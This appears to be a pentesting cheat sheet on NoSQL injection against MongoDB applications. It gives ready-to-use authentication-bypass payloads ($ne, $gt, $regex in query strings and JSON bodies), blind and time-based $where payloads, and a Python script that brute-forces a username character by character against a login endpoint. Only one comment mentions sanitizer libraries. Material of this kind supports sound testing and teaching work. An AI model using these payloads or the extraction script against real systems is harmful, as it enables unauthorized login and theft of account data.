# NoSQL Injection (MongoDB)

## Detection
```
' - errors if quotes not sanitized
{"$where": "1==1"}
[$ne]=1
```

## Authentication Bypass

### Query Parameter Injection
```
username[$ne]=admin&password[$ne]=admin
username=admin&password[$ne]=wrongpass
username[$regex]=^adm&password[$ne]=x
```

### JSON Body Injection
```json
{"username": "admin", "password": {"$ne": "wrongpassword"}}
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}
```

## Operator Reference
```
$eq       Equal
$ne       Not equal
$gt/$gte  Greater than / or equal
$lt/$lte  Less than / or equal
$in       In array
$nin      Not in array
$regex    Regex match
$where    JavaScript expression
$exists   Field exists
$or/$and  Logical operators
```

## Blind NoSQL Injection

### Boolean-Based
```
username[$regex]=^a&password[$ne]=1     # True if username starts with 'a'
username[$regex]=^admin$&password[$ne]=1
```

### Extract Data Character by Character
```python
import requests

url = "https://target.com/login"
known = ""
chars = "abcdefghijklmnopqrstuvwxyz0123456789"

for pos in range(20):
    for c in chars:
        payload = {"username": {"$regex": f"^{known}{c}"}, "password": {"$ne": ""}}
        r = requests.post(url, json=payload)
        if "success" in r.text:
            known += c
            break
    else:
        break
print(known)
```

## $where JavaScript Injection
```
$where: "this.password.match(/^a/)"
$where: "sleep(5000)"                    # Time-based blind
$where: "this.username == this.password" # Logic bypass
```

## Time-Based Blind
```json
{"$where": "sleep(5000)"}
{"username": "admin", "$where": "sleep(5000)"}
```

## Node.js Specific
```javascript
// If using MongoDB with Express and no sanitization
// req.body.username can be an object, not just string
// mongo-sanitize, express-mongo-sanitize can prevent this
```

## Tools
```
NoSQLMap          # Automated NoSQL injection
```
